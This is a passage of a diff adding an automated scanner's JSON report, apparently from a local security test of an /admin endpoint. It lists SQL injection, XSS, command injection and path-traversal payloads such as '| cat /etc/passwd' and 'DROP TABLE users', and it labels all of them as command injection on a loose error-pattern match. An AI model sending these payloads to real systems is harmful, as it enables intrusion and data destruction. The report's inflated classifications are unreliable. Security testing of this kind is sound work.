+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "exec=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "exec=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "exec=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "exec=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "exec=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "exec=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "exec=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "exec=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "run=' OR '1'='1",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "run='; DROP TABLE users; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "run=' UNION SELECT * FROM information_schema.tables; --",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "run=<script>alert('xss')</script>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "run=<img src=x onerror=alert('xss')>",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "run=javascript:alert('xss')",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "run=; ls -la",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "run=| cat /etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "run=`whoami`",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Fuzzing Detected COMMAND Vulnerability",
+      "endpoint": "http://localhost:5000/admin",
+      "payload": "run=../../../etc/passwd",
+      "method": "GET",
+      "evidence": "Error pattern matched: command injection possible"
+    },
+    {
+      "type": "Tool Integration",
+      "endpoint": "http://localhost:5000",
+      "payload": "N/A",
+      "method": "N/A",
+      "evidence": "Nmap not available - install for network scanning"
+    }
+  ],
+  "tools": [],
+  "summary": {
+    "total_vulnerabilities": 413,
+    "vulnerability_types": {
+      "SQL Injection": 2,
+      "Command Injection": 11,
+      "XML External Entity (XXE)": 30,
+      "Login Cross-Site Request Forgery": 1,
+      "Sensitive Data Exposure": 2,
+      "Broken Access Control": 21,
+      "Security Misconfiguration": 2,
+      "Clickjacking Vulnerability": 9,
+      "Missing Content Security Policy": 6,
+      "Missing X-Content-Type-Options": 6,
+      "Missing Referrer-Policy": 6,
+      "Missing Feature-Policy/Permissions-Policy": 6,
+      "Missing X-XSS-Protection": 6,
+      "Missing X-Permitted-Cross-Domain-Policies": 6,
+      "Missing Cross-Origin-Embedder-Policy": 6,
+      "Missing Cross-Origin-Opener-Policy": 6,
+      "Missing Cross-Origin-Resource-Policy": 6,
+      "Fuzzing Detected COMMAND Vulnerability": 280,
+      "Tool Integration": 1
+    },
+    "tools_run": 0,
+    "scan_duration": 103.1607768535614
+  },
+  "connectivity": true
+}
